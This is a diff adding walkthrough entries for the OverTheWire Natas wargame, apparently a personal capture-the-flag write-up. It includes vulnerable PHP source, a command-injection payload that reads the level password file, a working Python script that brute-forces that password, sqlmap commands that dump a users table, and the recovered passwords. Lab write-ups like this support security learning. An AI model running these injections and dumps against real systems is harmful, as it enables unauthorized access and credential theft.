@@ -305,3 +305,93 @@ password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
 
 
 Natas17:
+This challenge is very similar to the previous one.
+We have the source code:
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+
+Because $key is between \"\" and they do not permit the characters [;|&`'"], we have to inject commands via $()
+one clever way to do this is
+$(grep ^a /etc/natas_webpass/natas17)zigzag
+
+The 'zigzag' word is in dictionary.txt.
+If the first character of the password is 'a', the command $(grep ^a /etc/natas_webpass/natas17) evaluates to <password>, and the query becomes
+grep -i "<password>zigzag" dictionary.txt
+This would not correspond to any match in the dictionary.
+If the character '^a' is not in the password, the command $(grep ^a /etc/natas_webpass/natas17) evaluates to the empty string, and the query becomes
+grep -i "zigzag" dictionary.txt
+which returns the zigzag word.
+
+Therefore, we make a python script that makes HTTP requests looking for the password.
+I will make use of my previous script, the only difference is that it is no SQL Injection any more. It is a Bash injection. But it still is Boolean based.
+
+dict_request.py
+-----------------------------------------------------------------------------------------------------------------------------------------------------+
+import requests                                                                                                                                      |
+                                                                                                                                                     |
+url = 'http://natas16.natas.labs.overthewire.org/index.php?debug=True'                                                                               |
+# url = http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+a+%2Fetc%2Fnatas_webpass%2Fnatas17%29zigzag&submit=Search                       |
+headers = { 'Authorization': 'Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=='}                                                       |
+characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"                                                                        |
+                                                                                                                                                     |
+# attempt is the password attempt                                                                                                                    |
+def send_payload(attempt, like):                                                                                                                     |
+    if like:   # regex ^password                                                                                                                     |
+        url = f'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+%5E{attempt}+%2Fetc%2Fnatas_webpass%2Fnatas17%29zigzag&submit=Search'   |
+    else:      # regex ^password$                                                                                                                    |
+        url = f'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+%5E{attempt}%24+%2Fetc%2Fnatas_webpass%2Fnatas17%29zigzag&submit=Search'|
+    r = requests.get(url, headers=headers)                                                                                                           |
+    raw = str(r.content)                                                                                                                             |
+    return "zigzag" not in raw                                                                                                                       |
+                                                                                                                                                     |
+passwd = ""; found = False                                                                                                                           |
+while not found:                                                                                                                                     |
+    for c in characters:                                                                                                                             |
+        correct = send_payload(passwd + c, like=True)                                                                                                |
+        print("attempting:", passwd+c)                                                                                                               |
+        if correct:                                                                                                                                  |
+            passwd += c                                                                                                                              |
+            print("GOT IT:", passwd)                                                                                                                 |
+            found = send_payload(passwd, like=False)                                                                                                 |
+            break                                                                                                                                    |
+                                                                                                                                                     |
+print("\nThe password is", passwd)                                                                                                                   |
+-----------------------------------------------------------------------------------------------------------------------------------------------------+
+Notice that our program now makes a GET request, but it functions with the same logic.
+
+password: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
+
+
+Natas18:
+The only differences between this one and Natas15 are the commented lines
+
+if(mysqli_num_rows($res) > 0) {
+    //echo "This user exists.<br>";
+} else {
+    //echo "This user doesn't exist.<br>";
+}
+} else {
+    //echo "Error in query.<br>";
+}
+
+This turns the Boolean based SQL Injection into a Blind Time-based SQL Injection.
+I will not write a script for this, because it seems complicated, but sqlmap will certainly take care of this for us
+
+sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php?debug" --data="username=natas18" --auth-type=Basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd --level=5 --risk=3 --proxy="http://127.0.0.1:8080" --dbms=mysql
+
+sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php?debug" --data="username=natas18" --auth-type=Basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd --level=5 --risk=3 --proxy="http://127.0.0.1:8080" -D natas17 -T users -C username,password --dump --dbms=mysql
+
+password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
